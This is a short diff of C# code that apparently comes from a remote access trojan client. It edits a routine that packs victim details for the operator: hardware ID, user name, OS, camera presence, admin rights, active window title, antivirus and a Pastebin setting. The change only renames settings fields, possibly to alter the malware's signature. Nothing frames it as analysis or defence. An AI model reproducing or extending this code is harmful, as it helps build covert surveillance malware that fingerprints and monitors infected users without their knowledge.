@@ -20,15 +20,15 @@ namespace Client.Helper
     {
       MsgPack msgPack1 = new MsgPack();
       msgPack1.ForcePathObject("Pac_ket").AsString = "ClientInfo";
-      msgPack1.ForcePathObject("HWID").AsString = Settings.Hw_id;
+      msgPack1.ForcePathObject("HWID").AsString = Settings.hwId;
       msgPack1.ForcePathObject("User").AsString = Environment.UserName.ToString();
       msgPack1.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", (string) null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
       msgPack1.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
       msgPack1.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
-      msgPack1.ForcePathObject("Version").AsString = Settings.Ver_sion;
+      msgPack1.ForcePathObject("Version").AsString = Settings.verSion;
       msgPack1.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
       msgPack1.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
-      msgPack1.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin;
+      msgPack1.ForcePathObject("Paste_bin").AsString = Settings.pasteBin;
       msgPack1.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
       MsgPack msgPack2 = msgPack1.ForcePathObject("Install_ed");
       DateTime dateTime = new FileInfo(Application.ExecutablePath).LastWriteTime;
